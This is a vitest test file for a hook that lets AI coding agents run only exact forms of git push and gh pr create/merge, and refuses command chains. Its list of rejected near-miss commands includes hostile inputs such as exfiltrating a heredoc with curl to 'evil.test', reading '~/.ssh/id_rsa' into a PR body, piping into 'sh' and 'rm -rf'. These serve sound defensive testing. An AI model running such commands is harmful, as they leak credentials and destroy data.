import { spawnSync } from "node:child_process";
import { cpSync, rmSync } from "node:fs";
import { join } from "node:path";
import { pathToFileURL } from "node:url";
import { describe, expect, it } from "vitest";

import { APPROVING_HOST, judgeCall, mayApprove } from "../files/tools/agent-workflow/hooks/split-outward-commands.mts";
import { approvedShape, readExact } from "../files/tools/agent-workflow/lib/approve.mts";
import { APPROVING_HOST as HOST_IN_CHECK, ASK_RULES, CLAUDE_SETTINGS, CODEX_HOOKS, CONFIG_FILE, HOOK_SCRIPT } from "../files/tools/agent-workflow/lib/host.mts";
import { judgeCommand } from "../files/tools/agent-workflow/lib/outward.mts";
import { ADDON, createFolder, readJson, writeFile } from "./support.mts";

const HEREDOC_BODY = "\"$(cat <<'EOF'\n## Summary\n- don't chain; `git push` && $(rm -rf x) | $HOME \"quoted\"\nEOF\n)\"";
const LONGEST = `worktree-${"a".repeat(91)}`;

/** Every command the hook approves, with what it says it approved. */
const APPROVED: [string, string][] = [
  ["git push origin worktree-a", "a push of the work branch worktree-a to origin"],
  ["git push -u origin worktree-rates-filter", "a push of the work branch worktree-rates-filter to origin"],
  ["git push --set-upstream origin worktree-a.b_c-1", "a push of the work branch worktree-a.b_c-1 to origin"],
  [`git push origin ${LONGEST}`, `a push of the work branch ${LONGEST} to origin`],
  ["git  push \t origin   worktree-a ", "a push of the work branch worktree-a to origin"],
  ["git push origin worktree-a 2>&1", "a push of the work branch worktree-a to origin"],
  ["git push origin worktree-a | tail -2", "a push of the work branch worktree-a to origin"],
  ["git push -u origin worktree-a 2>&1 | tail -n 5", "a push of the work branch worktree-a to origin"],
  ["git push -u origin worktree-a 2>&1 | head -20", "a push of the work branch worktree-a to origin"],
  ["gh pr create", "opening a pull request"],
  ["gh pr create --fill", "opening a pull request"],
  ["gh pr create -f -d", "opening a pull request"],
  ["gh pr create --title T --body B", "opening a pull request"],
  ['gh pr create --title "fix: a thing (#12)!" --body \'no $expansion `here` \\n && ; |\'', "opening a pull request"],
  ['gh pr create -t "x" -b "two\nlines" -B main -H worktree-a --draft', "opening a pull request"],
  ["gh pr create --fill --base release/1.x --head worktree-a", "opening a pull request"],
  [`gh pr create --title "feat: prices" --body ${HEREDOC_BODY}`, "opening a pull request"],
  [`gh pr create --body ${HEREDOC_BODY} --title 'x' 2>&1 | tail -3`, "opening a pull request"],
  ["gh pr create --title x --body \"$(cat <<'BODY'\nBODY\n)\"", "opening a pull request"],
  ["gh pr merge 12", "merging pull request 12"],
  ["gh pr merge 12 --merge", "merging pull request 12"],
  ["gh pr merge 12 -m -d", "merging pull request 12"],
  ["gh pr merge 7 --squash --delete-branch", "merging pull request 7"],
  ["gh pr merge 7 --rebase", "merging pull request 7"],
  ["gh pr merge 7 -s", "merging pull request 7"],
  ["gh pr merge 7 -r", "merging pull request 7"],
  ['gh pr merge 12 --merge --subject "docs: the week" --body \'as agreed\'', "merging pull request 12"],
  ["gh pr merge 12 -t x -b \"$(cat <<'MSG'\nwhy\nMSG\n)\"", "merging pull request 12"],
  ["gh pr merge 12 --merge --delete-branch 2>&1 | tail -2", "merging pull request 12"],
];

/** Commands one step away from an approved one. None may be approved. */
const NEAR_MISSES: [string, string][] = [
  // git push: more than one thing pushed, or something other than a plain push
  ["a second refspec", "git push origin worktree-a main"],
  ["--delete after the branch", "git push origin worktree-a --delete main"],
  ["--delete of the branch", "git push origin --delete worktree-a"],
  ["-d", "git push -d origin worktree-a"],
  ["--force-with-lease", "git push origin worktree-a --force-with-lease"],
  ["--force", "git push --force origin worktree-a"],
  ["-f", "git push -f origin worktree-a"],
  ["-f joined to -u", "git push -fu origin worktree-a"],
  ["a + refspec", "git push origin +worktree-a"],
  ["source:target", "git push origin worktree-a:main"],
  ["HEAD:target", "git push origin HEAD:worktree-a"],
  ["--mirror", "git push --mirror origin worktree-a"],
  ["--mirror in place of the branch", "git push origin --mirror"],
  ["--all", "git push --all origin"],
  ["--tags after the branch", "git push origin worktree-a --tags"],
  ["--tags before the remote", "git push --tags origin worktree-a"],
  ["--prune", "git push --prune origin worktree-a"],
  ["--no-verify", "git push --no-verify origin worktree-a"],
  ["--dry-run", "git push --dry-run origin worktree-a"],
  ["--push-option", "git push -u origin worktree-a --push-option=ci.skip"],
  ["--receive-pack", "git push --receive-pack=evil origin worktree-a"],
  ["--repo", "git push --repo=elsewhere origin worktree-a"],
  ["-u twice", "git push -u -u origin worktree-a"],
  ["-u after the remote", "git push origin -u worktree-a"],
  ["-u after the branch", "git push origin worktree-a -u"],
  ["--set-upstream with a value", "git push --set-upstream=origin worktree-a"],
  ["no branch", "git push origin"],
  ["no remote and no branch", "git push"],
  ["-u and no branch", "git push -u origin"],
  // git push: run somewhere else, or as someone else
  ["git -C", "git -C ../other push origin worktree-a"],
  ["git -c", "git -c push.default=matching push origin worktree-a"],
  ["a variable set in front", "GIT_SSH_COMMAND=evil git push origin worktree-a"],
  ["env in front", "env git push origin worktree-a"],
  ["a path to git", "/usr/bin/git push origin worktree-a"],
  ["a git beside the project", "./git push origin worktree-a"],
  ["another case", "Git push origin worktree-a"],
  ["another git command with the same words after it", "git fetch origin worktree-a"],
  ["git in quotes", "'git' push origin worktree-a"],
  // git push: to somewhere else
  ["another remote", "git push upstream worktree-a"],
  ["a URL for the remote", "git push https://example.test/x.git worktree-a"],
  ["an ssh address for the remote", "git push git@example.test:o/r.git worktree-a"],
  ["a folder for the remote", "git push ../other worktree-a"],
  ["this folder for the remote", "git push . worktree-a"],
  // git push: another branch
  ["main", "git push origin main"],
  ["a branch not named worktree-", "git push origin feature-x"],
  ["a branch that only contains worktree-", "git push origin my-worktree-a"],
  ["worktree- and no name", "git push origin worktree-"],
  ["worktree with no dash", "git push origin worktree"],
  ["a name that ends in a dot", "git push origin worktree-a."],
  ["a name with two dots", "git push origin worktree-a..b"],
  ["a name with a slash", "git push origin worktree-a/b"],
  ["a name that holds a flag", "git push origin worktree-a--force"],
  ["a name with ~", "git push origin worktree-a~1"],
  ["a name with ^", "git push origin worktree-a^"],
  ["a name with @{", "git push origin worktree-a@{u}"],
  ["a name longer than any real one", `git push origin ${LONGEST}a`],
  // git push: quoting, and anything the shell would expand
  ["two words in double quotes", 'git push origin "worktree-a main"'],
  ["an escaped space", "git push origin worktree-a\\ main"],
  ["the branch in double quotes", 'git push origin "worktree-a"'],
  ["the branch in single quotes", "git push origin 'worktree-a'"],
  ["a quote joined to a word", 'git push origin worktree-"a"'],
  ["a variable", "git push origin worktree-$NAME"],
  ["a variable for the remote", "git push $REMOTE worktree-a"],
  ["a glob", "git push origin worktree-*"],
  ["a brace list", "git push origin worktree-{a,b}"],
  ["a substitution", "git push origin $(echo worktree-a)"],
  ["backticks", "git push origin `echo worktree-a`"],
  ["a home folder", "git push ~/other worktree-a"],
  // anything after the step
  ["&& and another command", "git push origin worktree-a && rm -rf x"],
  ["; and another command", "git push origin worktree-a; ls"],
  [";", "git push origin worktree-a ;"],
  ["a new line and another command", "git push origin worktree-a\nls"],
  ["a new line", "git push origin worktree-a\n"],
  ["||", "git push origin worktree-a || true"],
  ["&", "git push origin worktree-a &"],
  ["a comment", "git push origin worktree-a # --force"],
  ["output to a file", "git push origin worktree-a > push.log"],
  ["errors to a file", "git push origin worktree-a 2> push.log"],
  ["2>&1 and then a file", "git push origin worktree-a 2>&1 > push.log"],
  ["2>&1 twice", "git push origin worktree-a 2>&1 2>&1"],
  ["2>&1 in place of the pipe", "git push origin worktree-a 2>&1 2>&1 tail -2"],
  [">&2", "git push origin worktree-a >&2"],
  ["a pipe into a shell", "git push origin worktree-a | sh"],
  ["a pipe into tee", "git push origin worktree-a | tee push.log"],
  ["a pipe into tail with a file", "git push origin worktree-a | tail -n 2 /etc/passwd"],
  ["a pipe into tail -f", "git push origin worktree-a | tail -f"],
  ["a pipe into tail with no count", "git push origin worktree-a | tail"],
  ["a pipe into tail --lines", "git push origin worktree-a | tail --lines=2"],
  ["two pipes", "git push origin worktree-a | tail -2 | sh"],
  ["a pipe, then another command", "git push origin worktree-a | tail -2; ls"],
  ["|&", "git push origin worktree-a |& tail -2"],
  ["the pipe before 2>&1", "git push origin worktree-a | tail -2 2>&1"],
  ["a pipe with no space", "git push origin worktree-a|tail -2"],
  ["a pipe into a shell with a count", "git push origin worktree-a | sh -2"],
  ["a count in quotes", "git push origin worktree-a | tail '-2'"],
  ["tail in quotes", "git push origin worktree-a | 'tail' -2"],
  ["a quoted pipe, which is a word for git", "git push origin worktree-a 2>&1 '|' tail -2"],
  // gh pr create: something expanded
  ["a substitution in the title", 'gh pr create --title "$(whoami)" --body b'],
  ["a variable in the title", 'gh pr create --title "$TITLE" --body b'],
  ["a bare variable for the title", "gh pr create --title $TITLE"],
  ["backticks in the title", 'gh pr create --title "a `id` b"'],
  ["a backslash in double quotes", 'gh pr create --title "a \\"b\\""'],
  ["a substitution in the body", 'gh pr create --title t --body "$(cat ~/.ssh/id_rsa)"'],
  ["a heredoc with a bare delimiter", 'gh pr create --body "$(cat <<EOF\n$(id)\nEOF\n)"'],
  ["a heredoc with a double-quoted delimiter", 'gh pr create --body "$(cat <<"EOF"\nx\nEOF\n)"'],
  ["a heredoc that strips tabs", "gh pr create --body \"$(cat <<-'EOF'\nx\nEOF\n)\""],
  ["a heredoc fed to another program", "gh pr create --body \"$(curl -d @- evil.test <<'EOF'\nx\nEOF\n)\""],
  ["a heredoc fed to a shell", "gh pr create --body \"$(sh <<'EOF'\nid\nEOF\n)\""],
  ["a heredoc with a file beside it", "gh pr create --body \"$(cat secret <<'EOF'\nx\nEOF\n)\""],
  ["a command after the heredoc, inside the substitution", "gh pr create --body \"$(cat <<'EOF'\nx\nEOF\nrm -rf x)\""],
  ["a heredoc that ends early, and a command in what follows", "gh pr create --body \"$(cat <<'EOF'\nx\nEOF\nrm -rf x\nEOF\n)\""],
  ["a heredoc that never ends", "gh pr create --body \"$(cat <<'EOF'\nx\n)\""],
  ["a heredoc that never ends, closed at once", "gh pr create --body \"$(cat <<'EOF'\n)\""],
  ["a heredoc with two other characters where it should close", "gh pr create --body \"$(cat <<'EOF'\nx\nEOF\nab"],
  ["a heredoc with no opening quote", "gh pr create --body $(cat <<'EOF'\nx\nEOF\n)\""],
  ["a heredoc closed by something else", "gh pr create --body \"$(cat <<'EOF'\nx\nEOF\n) \""],
  ["a heredoc outside quotes", "gh pr create --body $(cat <<'EOF'\nx\nEOF\n)"],
  ["a heredoc with text after it in the quotes", "gh pr create --body \"$(cat <<'EOF'\nx\nEOF\n) $HOME\""],
  ["a heredoc for the title", "gh pr create --title \"$(cat <<'EOF'\nx\nEOF\n)\""],
  ["a command after the heredoc form", `gh pr create --body ${HEREDOC_BODY} && ls`],
  ["a quote joined to a word in the title", "gh pr create --title a'b'"],
  ["a word joined to a quote in the title", 'gh pr create --title "a"b'],
  // gh pr create: a flag outside the short list
  ["--body-file", "gh pr create --title t --body-file notes.md"],
  ["-F from standard input", "gh pr create --title t -F -"],
  ["--template", "gh pr create --template .env"],
  ["--repo", "gh pr create --fill --repo other/project"],
  ["-R", "gh pr create --fill -R other/project"],
  ["gh -R", "gh -R other/project pr create --fill"],
  ["--web", "gh pr create --web"],
  ["--editor", "gh pr create --editor"],
  ["--reviewer", "gh pr create --fill --reviewer someone"],
  ["--assignee", "gh pr create --fill --assignee someone"],
  ["--label", "gh pr create --fill --label urgent"],
  ["--fill-first", "gh pr create --fill-first"],
  ["--dry-run", "gh pr create --dry-run"],
  ["--recover", "gh pr create --recover file.json"],
  ["--title with =", "gh pr create --title=t"],
  ["--title twice", "gh pr create --title a --title b"],
  ["--title and its short form", "gh pr create -t a --title b"],
  ["--title with nothing after it", "gh pr create --title"],
  ["a head branch that is not a work branch", "gh pr create --fill --head main"],
  ["a head in another fork", "gh pr create --fill --head someone:worktree-a"],
  ["a base in quotes", 'gh pr create --fill --base "main"'],
  ["a base that is a flag", "gh pr create --fill --base --web"],
  ["a base with two dots", "gh pr create --fill --base main..x"],
  ["a word that is not a flag", "gh pr create extra"],
  ["a word every object has", "gh pr create constructor"],
  ["another word every object has", "gh pr create toString"],
  ["a token set in front", "GH_TOKEN=abc gh pr create --fill"],
  ["gh in quotes", '"gh" pr create --fill'],
  ["pr in quotes", "gh 'pr' create --fill"],
  ["a flag in quotes", "gh pr create '--fill'"],
  ["output to a file", "gh pr create --fill > out.txt"],
  // gh pr merge
  ["--admin", "gh pr merge 12 --merge --admin"],
  ["--admin alone", "gh pr merge 12 --admin"],
  ["--repo", "gh pr merge 12 --merge --repo other/project"],
  ["-R", "gh pr merge 12 -R other/project"],
  ["--auto", "gh pr merge 12 --merge --auto"],
  ["--disable-auto", "gh pr merge 12 --disable-auto"],
  ["--body-file", "gh pr merge 12 --merge --body-file notes.md"],
  ["--match-head-commit", "gh pr merge 12 --match-head-commit abc123"],
  ["--author-email", "gh pr merge 12 --author-email nobody"],
  ["no number", "gh pr merge"],
  ["a flag and no number", "gh pr merge --merge"],
  ["the number after a flag", "gh pr merge --merge 12"],
  ["two numbers", "gh pr merge 12 13"],
  ["a branch in place of the number", "gh pr merge worktree-a"],
  ["a URL in place of the number", "gh pr merge https://example.test/o/r/pull/12"],
  ["the number in quotes", 'gh pr merge "12"'],
  ["zero", "gh pr merge 0"],
  ["a number with a zero in front", "gh pr merge 012"],
  ["a negative number", "gh pr merge -1"],
  ["two ways to merge", "gh pr merge 12 --merge --squash"],
  ["one way to merge, twice", "gh pr merge 12 -m --merge"],
  ["--delete-branch twice", "gh pr merge 12 --delete-branch -d"],
  ["short flags joined", "gh pr merge 12 -md"],
  ["--subject with nothing after it", "gh pr merge 12 --subject"],
  ["a substitution in the subject", 'gh pr merge 12 --subject "$(id)"'],
  ["a word every object has", "gh pr merge 12 hasOwnProperty"],
  ["a push joined to it", "gh pr merge 12 --merge && git push origin worktree-a"],
  // other steps: never approved, whatever their form
  ["gh pr edit", "gh pr edit 12 --title t"],
  ["gh pr close", "gh pr close 12"],
  ["gh pr comment", "gh pr comment 12 --body hi"],
  ["gh pr merge spelled longer", "gh pr merged 12"],
  ["gh workflow run", "gh workflow run ci.yml"],
  ["a gh api write", "gh api repos/o/r/git/refs -X POST"],
  ["gh issue create", "gh issue create --title t"],
  ["a local command", "git commit -m wip"],
  ["another program", "glab mr create"],
  ["nothing", ""],
  ["gh alone", "gh pr"],
];

describe("a routine outward step in its exact form", () => {
  it.each(APPROVED)("is approved: %s", (command, shape) => {
    expect(approvedShape(command)).toBe(shape);
  });

  it.each(APPROVED)("is one outward step and no chain, as the refusal reads it: %s", (command) => {
    expect(judgeCommand(command)).toMatchObject({ chained: false });
    expect(judgeCommand(command)?.outward).toHaveLength(1);
  });

  // Read with a model of the documented matching (`*` is any text). An ask
  // rule wins over the hook, so a command both approve would still ask.
  it.each(APPROVED)("meets no ask rule, so the approval is not undone by one: %s", (command) => {
    const matching = ASK_RULES.filter((rule) =>
      new RegExp(`^${rule.slice("Bash(".length, -1).split("*").map((part) => part.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")).join("[^]*")}$`).test(command),
    );

    expect(matching).toEqual([]);
  });

  it("covers the three shapes", () => {
    expect([...new Set(APPROVED.map(([command]) => approvedShape(command)?.replace(/worktree-\S+|\d+/, "…")))]).toEqual([
      "a push of the work branch … to origin",
      "opening a pull request",
      "merging pull request …",
    ]);
  });
});

describe("a command one step away from an approved one", () => {
  it("is tried in more than a hundred and fifty ways, no two the same", () => {
    expect(NEAR_MISSES.length).toBeGreaterThan(150);
    expect(new Set(NEAR_MISSES.map(([, command]) => command)).size).toBe(NEAR_MISSES.length);
  });

  it.each(NEAR_MISSES)("is not approved: %s", (_name, command) => {
    expect(approvedShape(command)).toBeUndefined();
  });

  it.each(NEAR_MISSES)("is not approved by the hook either: %s", (_name, command) => {
    expect(judgeCall({ tool_name: "Bash", tool_input: { command } }, true)?.decision).not.toBe("allow");
  });
});

describe("the reader", () => {
  it("knows four kinds of token and two marks", () => {
    expect(readExact("a-b_c./1 'x $y' \"p q\" 2>&1 | tail")).toEqual([
      { kind: "bare", value: "a-b_c./1" },
      { kind: "single", value: "x $y" },
      { kind: "double", value: "p q" },
      { kind: "mark", value: "2>&1" },
      { kind: "mark", value: "|" },
      { kind: "bare", value: "tail" },
    ]);
  });

  it("reads the heredoc form as one token, with its body as written", () => {
    expect(readExact("\"$(cat <<'END'\n  line one\n  $(two)\n\nEND\n)\"")).toEqual([{ kind: "heredoc", value: "  line one\n  $(two)\n" }]);
    expect(readExact("\"$(cat <<'END'\nx\nEND\n)\" next")).toEqual([
      { kind: "heredoc", value: "x" },
      { kind: "bare", value: "next" },
    ]);
    expect(readExact("\"$(cat <<'END'\nEND\n)\"")).toEqual([{ kind: "heredoc", value: "" }]);
  });

  it("does not take a line that only starts with the delimiter for its end", () => {
    expect(readExact("\"$(cat <<'END'\nENDING\nEND\n)\"")).toEqual([{ kind: "heredoc", value: "ENDING" }]);
  });

  it.each([
    ["a variable", "$HOME"],
    ["a variable in a word", "a$b"],
    ["a glob", "*.md"],
    ["a question mark", "a?"],
    ["a bracket", "[a]"],
    ["a brace", "{a,b}"],
    ["a tilde", "~"],
    ["a backslash", "a\\b"],
    ["a backtick", "`a`"],
    ["a substitution", "$(a)"],
    ["a process substitution", "<(a)"],
    ["a redirection", ">f"],
    ["a redirection with a space after it", "> f"],
    ["an input redirection", "<f"],
    ["a semicolon", ";"],
    ["an ampersand", "&"],
    ["a hash", "#a"],
    ["a new line", "a\nb"],
    ["a carriage return", "a\rb"],
    ["a colon", "a:b"],
    ["a plus", "+a"],
    ["an equals sign", "a=b"],
    ["an at sign", "a@b"],
    ["an exclamation mark outside quotes", "a!"],
    ["a quote that never closes", "'a"],
    ["a double quote that never closes", '"a'],
    ["a variable in double quotes", '"a $b"'],
    ["a backtick in double quotes", '"a `b`"'],
    ["a backslash in double quotes", '"a\\nb"'],
    ["two quotes joined", "'a''b'"],
    ["a mark joined to a word", "2>&1x"],
    ["two pipes", "||"],
  ])("has no token for %s", (_name, text) => {
    expect(readExact(text)).toBeUndefined();
    expect(readExact(`git ${text} push`)).toBeUndefined();
  });
});

describe("the hook's answer, by what it is allowed to do", () => {
  const push = { tool_name: "Bash", tool_input: { command: "git push -u origin worktree-a" } };

  it("approves an exact shape when it may, and says what it approved", () => {
    expect(judgeCall(push, true)).toEqual({
      decision: "allow",
      reason: "Approved by tools/agent-workflow: a push of the work branch worktree-a to origin, in the exact form the project pre-approves.",
    });
  });

  it("says nothing about the same command when it may not approve", () => {
    expect(judgeCall(push, false)).toBeUndefined();
    expect(judgeCall(push)).toBeUndefined();
  });

  it("refuses a chain whether it may approve or not, even one that starts as an approved shape", () => {
    const chain = { tool_name: "Bash", tool_input: { command: "git push -u origin worktree-a && gh pr create --fill" } };

    expect(judgeCall(chain, true)?.decision).toBe("deny");
    expect(judgeCall(chain, false)?.decision).toBe("deny");
  });

  it("does not approve words it put together itself: only text the host will run as it is", () => {
    expect(judgeCall({ tool_input: { command: ["git", "push", "origin", "worktree-a"] } }, true)).toBeUndefined();
  });

  it("says nothing about an outward step that is alone and not one of the shapes", () => {
    expect(judgeCall({ tool_name: "Bash", tool_input: { command: "git push origin main" } }, true)).toBeUndefined();
    expect(judgeCall({ tool_name: "Bash", tool_input: { command: "gh workflow run ci.yml" } }, true)).toBeUndefined();
  });
});

describe("whether the hook may approve", () => {
  it("needs the host's argument and the project's setting, both", async () => {
    const on = createConfig("export const approveExactShapes: boolean = true;\n");

    await expect(mayApprove([APPROVING_HOST], on)).resolves.toBe(true);
    await expect(mayApprove([], on)).resolves.toBe(false);
    await expect(mayApprove(["--host=codex"], on)).resolves.toBe(false);
    await expect(mayApprove(["--host=claude-code-2"], on)).resolves.toBe(false);
  });

  it.each([
    ["set to false", "export const approveExactShapes: boolean = false;\n"],
    ["set to a word", 'export const approveExactShapes = "true";\n'],
    ["set to 1", "export const approveExactShapes = 1;\n"],
    ["not set", "export const somethingElse = true;\n"],
    ["a file that throws", 'throw new Error("broken");\n'],
    ["not TypeScript", "export const = ;\n"],
  ])("does not approve when the setting is %s", async (_name, content) => {
    await expect(mayApprove([APPROVING_HOST], createConfig(content))).resolves.toBe(false);
  });

  it("does not approve when there is no setting file", async () => {
    await expect(mayApprove([APPROVING_HOST], pathToFileURL(join(createFolder(), "tools/agent-workflow.config.mts")))).resolves.toBe(false);
  });

  it("is on in the file a project starts with", async () => {
    await expect(mayApprove([APPROVING_HOST], pathToFileURL(join(ADDON, "files", CONFIG_FILE)))).resolves.toBe(true);
    await expect(mayApprove([APPROVING_HOST])).resolves.toBe(true);
  });

  it("is spelled the same where the hook reads it and where the check looks for it", () => {
    expect(HOST_IN_CHECK).toBe(APPROVING_HOST);
  });
});

// The hook as each host starts it: the arguments are taken from the command
// the add-on's manifest registers for that host, not written again here.
describe("the hook run as a program, the way each host's settings start it", () => {
  const approved = "git push -u origin worktree-a 2>&1 | tail -2";
  const unanswered = "git push origin main";
  const refused = "git commit -m wip && git push -u origin worktree-a";

  it("is started with the approving argument by Claude Code's settings, and without it by Codex's", () => {
    expect(argumentsFor(CLAUDE_SETTINGS)).toEqual([APPROVING_HOST]);
    expect(argumentsFor(CODEX_HOOKS)).toEqual([]);
  });

  it("answers Claude Code: allow for an exact shape, nothing for another lone step, deny for a chain", () => {
    const project = createProject();

    expect(decisionOf(project, CLAUDE_SETTINGS, approved)).toBe("allow");
    expect(decisionOf(project, CLAUDE_SETTINGS, unanswered)).toBe("");
    expect(decisionOf(project, CLAUDE_SETTINGS, refused)).toBe("deny");
  });

  it("never answers Codex with allow: nothing for an exact shape, nothing for another lone step, deny for a chain", () => {
    const project = createProject();

    expect(decisionOf(project, CODEX_HOOKS, approved)).toBe("");
    expect(decisionOf(project, CODEX_HOOKS, unanswered)).toBe("");
    expect(decisionOf(project, CODEX_HOOKS, refused)).toBe("deny");
  });

  it("answers Codex with nothing for every approved command, so it is never sent a decision it does not take", () => {
    const project = createProject();

    for (const [command] of APPROVED) {
      expect(decisionOf(project, CODEX_HOOKS, command), command).toBe("");
    }
  });

  it("approves nothing once the project turns approval off, and still refuses a chain", () => {
    const project = createProject();

    writeFile(project, CONFIG_FILE, "export const approveExactShapes: boolean = false;\n");

    expect(decisionOf(project, CLAUDE_SETTINGS, approved)).toBe("");
    expect(decisionOf(project, CLAUDE_SETTINGS, refused)).toBe("deny");
    expect(decisionOf(project, CODEX_HOOKS, refused)).toBe("deny");
  });

  it("approves nothing when the setting file is gone, and still refuses a chain", () => {
    const project = createProject();

    rmSync(join(project, CONFIG_FILE));

    expect(decisionOf(project, CLAUDE_SETTINGS, approved)).toBe("");
    expect(decisionOf(project, CLAUDE_SETTINGS, refused)).toBe("deny");
  });

  it("prints one line of JSON with the reason when it approves, and exits 0", () => {
    const run = runHook(createProject(), CLAUDE_SETTINGS, approved);
    const reply = JSON.parse(run.stdout) as { hookSpecificOutput: Record<string, string> };

    expect(run.status).toBe(0);
    expect(run.stderr).toBe("");
    expect(Object.keys(reply)).toEqual(["hookSpecificOutput"]);
    expect(reply.hookSpecificOutput).toEqual({
      hookEventName: "PreToolUse",
      permissionDecision: "allow",
      permissionDecisionReason: "Approved by tools/agent-workflow: a push of the work branch worktree-a to origin, in the exact form the project pre-approves.",
    });
  });
});

/** A setting file with `content`, at the place it has in a project. */
function createConfig(content: string): URL {
  return pathToFileURL(join(createFolder({ "tools/agent-workflow.config.mts": content }), "tools/agent-workflow.config.mts"));
}

/** A folder with the add-on's tools and its setting file where a project has them. */
function createProject(): string {
  const project = createFolder();

  cpSync(join(ADDON, "files/tools"), join(project, "tools"), { recursive: true });

  return project;
}

/** What follows the script's path in the command the manifest registers for a host. */
function argumentsFor(settings: string): string[] {
  const manifest = readJson<{ hostSettings: Record<string, { hooks: { PreToolUse: { hooks: { command: string }[] }[] } }> }>(ADDON, "addon.json");
  const command = manifest.hostSettings[settings]?.hooks.PreToolUse[0]?.hooks[0]?.command ?? "";
  const after = command.slice(command.indexOf(HOOK_SCRIPT) + HOOK_SCRIPT.length).replace(/^"/, "");

  expect(command).toContain(HOOK_SCRIPT);

  return after.split(" ").filter(Boolean);
}

function runHook(project: string, settings: string, command: string): { status: number | null; stdout: string; stderr: string } {
  return spawnSync(process.execPath, [join(project, HOOK_SCRIPT), ...argumentsFor(settings)], {
    input: JSON.stringify({ tool_name: "Bash", tool_input: { command } }),
    encoding: "utf8",
  });
}

/** The decision the hook printed, or "" when it printed nothing. */
function decisionOf(project: string, settings: string, command: string): string {
  const { status, stdout } = runHook(project, settings, command);

  expect(status).toBe(0);

  return stdout === "" ? "" : (JSON.parse(stdout) as { hookSpecificOutput: { permissionDecision: string } }).hookSpecificOutput.permissionDecision;
}
